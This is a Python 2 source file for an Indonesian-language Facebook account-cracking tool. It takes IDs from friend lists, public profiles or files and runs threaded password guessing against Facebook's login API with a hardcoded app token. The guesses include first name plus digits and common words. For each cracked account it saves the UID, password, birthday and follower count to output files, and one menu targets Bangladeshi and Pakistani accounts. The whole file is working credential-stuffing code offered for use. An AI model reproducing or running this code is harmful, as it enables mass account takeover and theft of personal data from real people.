                            print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                            oks.append(user + pass4 + birthday + subscribers)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                            print '\x1b[1;93m(!) [Cekpoint]'
                            print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                            print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                            print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass4
                            print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                            print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                            print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                            cek = open('out/ind1.txt', 'a')
                            cek.write('UID:' + user + ' Katasandi:' + pass4 + 'Tanggal Lahir:' + birthday + 'Followers:' + subscribers + '\n')
                            cek.close()
                            cekpoint.append(user + pass4 + birthday + subscribers)
                        else:
                            pass5 = 'Anjing'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                print '\x1b[1;92m(!) [Berhasil]'
                                print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                                print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                                print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass5
                                print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                                print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                oks.append(user + pass5 + birthday + subscribers)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                print '\x1b[1;93m(!) [Cekpoint]'
                                print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                                print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                                print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass5
                                print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                                print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                cek = open('out/ind1.txt', 'a')
                                cek.write('UID:' + user + ' Katasandi:' + pass5 + 'Tanggal Lahir:' + birthday + 'Followers:' + subscribers + '\n')
                                cek.close()
                                cekpoint.append(user + pass5 + birthday + subscribers)
                            else:
                                pass6 = c['first_name'] + '321'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'access_token' in w:
                                    print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                    print '\x1b[1;92m(!) [Berhasil]'
                                    print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                                    print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                                    print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass6
                                    print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                                    print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                                    print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                    oks.append(user + pass6 + birthday + subscribers)
                                elif 'www.facebook.com' in w['error_msg']:
                                    print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                    print '\x1b[1;93m(!) [Cekpoint]'
                                    print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                                    print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                                    print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass6
                                    print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                                    print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                                    print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                    cek = open('out/ind1.txt', 'a')
                                    cek.write('UID:' + user + ' Katasandi:' + pass6 + 'Tanggal Lahir:' + birthday + 'Followers:' + subscribers + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6 + birthday + subscribers)
                                else:
                                    pass7 = 'Bangsat'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    w = json.load(data)
                                    if 'access_token' in w:
                                        print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                        print '\x1b[1;92m(!) [Berhasil]'
                                        print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                                        print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                                        print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass7
                                        print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                                        print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                                        print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                        oks.append(user + pass7 + birthday + subscribers)
                                    elif 'www.facebook.com' in w['error_msg']:
                                        print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                        print '\x1b[1;93m(!) [Cekpoint]'
                                        print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                                        print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                                        print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass7
                                        print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                                        print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                                        print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                        cek = open('out/ind1.txt', 'a')
                                        cek.write('UID:' + user + ' Katasandi:' + pass7 + 'Tanggal Lahir:' + birthday + 'Followers:' + subscribers + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7 + birthday + subscribers)
                                    else:
                                        pass8 = 'Doraemon'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        w = json.load(data)
                                        if 'access_token' in w:
                                            print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                            print '\x1b[1;92m(!) [Berhasil]'
                                            print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                                            print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                                            print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass8
                                            print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                                            print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                                            print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                            oks.append(user + pass8 + birthday + subscribers)
                                        elif 'www.facebook.com' in w['error_msg']:
                                            print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                            print '\x1b[1;93m(!) [Cekpoint]'
                                            print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                                            print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                                            print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass8
                                            print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                                            print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                                            print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                            cek = open('out/ind1.txt', 'a')
                                            cek.write('UID:' + user + ' Katasandi:' + pass8 + 'Tanggal Lahir:' + birthday + 'Followers:' + subscribers + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8 + birthday + subscribers)
                                        else:
                                            pass9 = 'Bajingan'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            w = json.load(data)
                                            if 'access_token' in w:
                                                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                                print '\x1b[1;92m(!) [Berhasil]'
                                                print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                                                print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                                                print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass9
                                                print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                                                print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                                                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                                oks.append(user + pass9 + birthday + subscribers)
                                            elif 'www.facebook.com' in w['error_msg']:
                                                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                                print '\x1b[1;93m(!) [Cekpoint]'
                                                print '\x1b[1;93m(+) Nama      : \x1b[1;97m ' + c['name']
                                                print '\x1b[1;93m(+) UID       : \x1b[1;97m ' + user
                                                print '\x1b[1;93m(+) Katasandi : \x1b[1;97m ' + pass9
                                                print '\x1b[1;93m(+) DD/MM/YY  : \x1b[1;97m ' + c['birthday']
                                                print '\x1b[1;93m(+) Followers : \x1b[1;97m ' + c['subscribers'] + '\n'
                                                print '\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                                                cek = open('out/ind1.txt', 'a')
                                                cek.write('UID:' + user + ' Katasandi:' + pass9 + 'Tanggal Lahir:' + birthday + 'Followers:' + subscribers + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass9 + birthday + subscribers)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;93m+\x1b[1;97m] \x1b[1;97mSelesai ....'
    print '\x1b[1;97m[\x1b[1;93m+\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m+\x1b[1;97m] \x1b[1;97mCP file tersimpan : out/ind1.txt'
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;93m[\x1b[1;97m Kembali \x1b[1;93m]')
    os.system('python2 XXXXX.py')


def bangla():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;94m01\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack dari Daftar Teman'
    print '\x1b[1;97m[\x1b[1;94m02\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack dari ID Publik / Teman'
    print '\x1b[1;97m[\x1b[1;94m03\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack dari File'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Kembali'
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    pilih_bangla()


def pilih_bangla():
    reak = raw_input('\x1b[1;93m-> \x1b[91m:\x1b[1;92m ')
    if reak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih_bangla()
    elif reak == '1' or reak == '01':
        os.system('clear')
        print logo
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
        
    elif reak == '2' or reak == '02':
        os.system('clear')
        print logo
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        print ' \x1b[1;94m    \xf0\x9f\xa4\xa1 \x1b[1;97mCRACK BANGLADESH / PAKISTAN \x1b[1;94m\xf0\x9f\xa4\xa1 '
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        dok = raw_input('\x1b[1;97m{\x1b[1;94m+\x1b[1;97m} ID Publik / Teman : ')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + dok + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;97m{\x1b[1;94m+\x1b[1;97m} Nama : ' + op['name']
        except KeyError:
            print '\x1b[1;97m[\x1b[1;94m+\x1b[1;97m] ID Publik / Teman Tidak Ada !'
            raw_input('\n[ Kembali ]')
            bangla()
        except requests.exceptions.ConnectionError:
            print '[!] Tidak ada koneksi !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + dok + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
        
    elif reak == '3' or reak == '03':
        os.system('clear')
        print logo
        
        try:
            print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
            idlist = raw_input('\x1b[1;97m{\x1b[1;94m?\x1b[1;97m} Nama File : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except KeyError:
            print '\x1b[1;97m[!] File Tidak Ada ! '
            raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
        except IOError:
            print '\x1b[1;97m[!] File Tidak Ada !'
            raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
            bangla()
        

    if reak == '0' or reak == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih_bangla()
    print '\x1b[1;97m{\x1b[1;94m+\x1b[1;97m} Total ID : ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;94m?\x1b[1;97m} Stop CTRL+Z'
    titik = [
        '.   ',
        '..  ',
        '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;94m\xe2\x80\xa2\x1b[1;97m} Crack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)
    
    print '\n\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    
    def main(arg):
        ubd = arg
        
        try:
            os.mkdir('out')
        except OSError:
            pass

        
        try:
            a = requests.get('https://graph.facebook.com/' + ubd + '/?access_token=' + toket)
            x = json.loads(a.text)
            bos1 = x['first_name'] + '123'
            data1 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            naga1 = json.load(data1)
            if 'access_token' in naga1:
                print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x80\xa2 ' + bos1
                oke.append(ubd + bos1)
            elif 'www.facebook.com' in naga1['error_msg']:
                print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x80\xa2 ' + bos1
                cek = open('out/pakisbang.txt', 'a')
                cek.write('ID:' + ubd + ' Pw:' + bos1 + '\n')
                cek.close()
                cpe.append(ubd + bos1)
            else:
                bos2 = x['first_name'] + '1234'
